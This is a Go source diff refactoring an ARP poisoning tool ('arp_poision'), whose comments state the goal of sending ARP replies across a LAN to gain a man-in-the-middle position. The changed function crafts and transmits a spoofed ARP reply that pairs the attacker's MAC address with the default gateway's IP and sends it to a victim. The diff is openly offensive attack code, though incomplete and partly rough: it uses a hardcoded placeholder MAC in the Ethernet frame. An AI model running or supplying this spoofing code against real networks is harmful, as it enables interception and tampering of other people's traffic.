@@ -4,7 +4,8 @@ import (
 	"log"
 	"net"
 
-	"arp_poision/commandLineHandle"
+	commandlinehandle "arp_poision/commandLineHandle"
+
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
@@ -12,9 +13,10 @@ import (
 
 // TODO: make a packet sender
 // NOTE: So we just need to send arp replay to all devices in the LAN inorder to get mitm
-// NOTE: So there is a type of arp messages that sent to all clients called Gratuitous which \
-//       is using the ethernet layer dest mac address as broadcast address (ff:ff:ff:ff:ff:ff) \
-//       to send the arp message to all client. Also the target mac in the arp message is broadcast too.
+//
+//	NOTE: So there is a type of arp messages that sent to all clients called Gratuitous which \
+//	      is using the ethernet layer dest mac address as broadcast address (ff:ff:ff:ff:ff:ff) \
+//	      to send the arp message to all client. Also the target mac in the arp message is broadcast too.
 var (
 	buffer gopacket.SerializableLayer
 	option gopacket.SerializableLayer
@@ -41,37 +43,28 @@ func craft_ethernet(targetHard net.HardwareAddr, attackerHard net.HardwareAddr) 
 		SrcMAC:       attackerHard,
 		DstMAC:       targetHard,
 	}
-	return ether;
+	return ether
 }
 
-// TODO:
-func getTargetMac(targetIp []byte){
-
-}
-
-func Packet(handler *pcap.Handle, args commandlinehandle.CommandLineArgs) {
-
-
-    mac := net.HardwareAddr{0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA};
-	ip := []byte{192, 168, 0, 2}
-    buffer := gopacket.NewSerializeBuffer();
-    eth := craft_ethernet(mac,mac);
-	// FIXME: Make a function that convert these type and parse them and check them
-    arp := craft_arp(net.ParseMAC(args.AttackerMAC), net.ParseMAC(args.VictimMAC), net.ParseIP(args.DefaultGateway).To4(), net.ParseIP(args.VictimIP).To4(), layers.ARPReply);
+func Packet(handler *pcap.Handle, args commandlinehandle.ParsedCommandLine) {
+	mac := net.HardwareAddr{0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA}
+	buffer := gopacket.NewSerializeBuffer()
+	eth := craft_ethernet(mac, mac)
+	// FIXED: Make a function that convert these type and parse them and check them
+	arp := craft_arp(args.AttackerMAC, args.VictimMAC, args.DefaultGateway, args.VictimIP, layers.ARPReply)
 	opt := gopacket.SerializeOptions{
-		FixLengths: true,
+		FixLengths:       true,
 		ComputeChecksums: true,
 	}
-	err := gopacket.SerializeLayers(buffer, opt, eth,arp);
+	err := gopacket.SerializeLayers(buffer, opt, eth, arp)
 	if err != nil {
-		log.Fatal("Error serilize the packet ", err);
+		log.Fatal("Error serilize the packet ", err)
 	}
-	err = handler.WritePacketData(buffer.Bytes());
+	err = handler.WritePacketData(buffer.Bytes())
 	if err != nil {
-		log.Fatal("Error serilize the packet ", err);
+		log.Fatal("Error serilize the packet ", err)
 	}
-    
-	log.Printf("Everything goes as expected packet has been sent \n" );
-	log.Println(string(ip) );
 
+	log.Printf("Everything goes as expected packet has been sent \n")
+	log.Println("Eth ", eth)
 }
